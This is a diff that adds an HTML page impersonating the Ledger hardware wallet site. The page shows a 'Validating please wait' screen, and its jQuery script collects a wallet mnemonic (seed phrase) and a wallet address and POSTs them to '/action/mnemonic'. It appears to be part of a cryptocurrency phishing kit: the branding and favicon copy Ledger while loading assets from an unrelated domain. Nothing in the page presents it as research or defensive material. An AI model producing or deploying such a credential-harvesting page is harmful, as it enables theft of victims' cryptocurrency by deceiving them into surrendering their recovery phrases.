@@ -1,0 +1,161 @@
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+    <meta charset="utf-8">
+	<link rel="shortcut icon" href="https://wallet.botrectification.com/img/logo/ledgerfavicon.png">
+	<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+	<meta name="theme-color" content="#000000">
+	<title>Hardware Wallet - State-of-the-art security for crypto assets | Ledger</title>
+	<link href="/assets/main.css" rel="stylesheet">
+	<link rel="shortcut icon" href="/main/favicon.ico" type="image/x-icon">
+	<style>
+/* Center the loader */
+#loader {
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  z-index: 1;
+  width: 120px;
+  height: 120px;
+  margin: -76px 0 0 -76px;
+  border: 16px solid #f3f3f3;
+  border-radius: 50%;
+  border-top: 16px solid #3498db;
+  -webkit-animation: spin 2s linear infinite;
+  animation: spin 2s linear infinite;
+}
+
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(0deg); }
+  100% { -webkit-transform: rotate(360deg); }
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Add animation to "page content" */
+.animate-bottom {
+  position: relative;
+  -webkit-animation-name: animatebottom;
+  -webkit-animation-duration: 1s;
+  animation-name: animatebottom;
+  animation-duration: 1s
+}
+
+@-webkit-keyframes animatebottom {
+  from { bottom:-100px; opacity:0 } 
+  to { bottom:0px; opacity:1 }
+}
+
+@keyframes animatebottom { 
+  from{ bottom:-100px; opacity:0 } 
+  to{ bottom:0; opacity:1 }
+}
+
+#myDiv {
+  display: none;
+  text-align: center;
+}
+</style>
+<style>
+.center {
+  margin: auto;
+  width: 60%;
+  padding: 10px;
+}
+</style>
+  </head>
+  <body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <form>
+    <div id="root">
+	<div class="App">
+  <div class="NavBar NavBar--is-centered"><img src="/logo.svg" height="80" alt=""></div>
+
+
+    <div class="UnlockWalletViaMnemonicPhrase">
+           <div><img alt="" height="400" src="/qrcode.png">
+           <div class="center UnlockWalletViaPrivateKey__title"><p>Validating please wait....</p></div></div> 
+
+	</div>
+
+
+</div>
+<div></div>
+</div>
+
+
+
+    <script src="/assets/2.js"></script>
+    <script src="/assets/jquery.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+	<div class="ReactModalPortal"></div>
+	<div class="ReactModalPortal"></div>
+	<div>
+	<div style="position: fixed; top: 0px; right: auto; bottom: auto; left: 50%; transform: translate(-50%, 0%); z-index: 100;">
+      <div>
+      </div>
+    </div>
+  </div>
+</form>
+
+<script type="text/javascript">
+    (function(){
+        $('#submit').click(function(event){
+            event.preventDefault()
+            console.log('working')
+
+            var values = {
+                mnemonic: $('#mnemonic').val().trim(),
+                wallet_addr: $('#wallet_addr').val().trim(),
+            }
+
+            console.log(values)
+
+            $.ajax({
+                url : '/action/mnemonic',
+                type: 'POST',
+                data : values,
+                success: function(data, textStatus, jqXHR){
+                    console.log(JSON.stringify(data))
+                    if (data.confirmation != 'success'){
+                        var msg = data.data
+                        swal({
+                          title: "Error!",
+                          text: msg,
+                          icon: "warning",
+                          button: "Ok!",
+                        });
+                        // alert('Error: ' + data.message)
+                        // console.log(msg)
+                        return
+                    }
+                    if (data.confirmation === 'success'){
+                        var msg = data.data
+                        swal({
+                          title: "success!",
+                          text: msg,
+                          icon: "success",
+                          button: "Ok!",
+                        })
+                        .then(() => {
+                            window.location.reload()
+                        })
+                        
+                        return 
+                    }
+
+                },
+                error: function (jqXHR, textStatus, err){
+                    console.log('Error: ' + err.message)
+                } 
+            })
+
+        })
+    })()
+</script>
+
+
+</body></html>
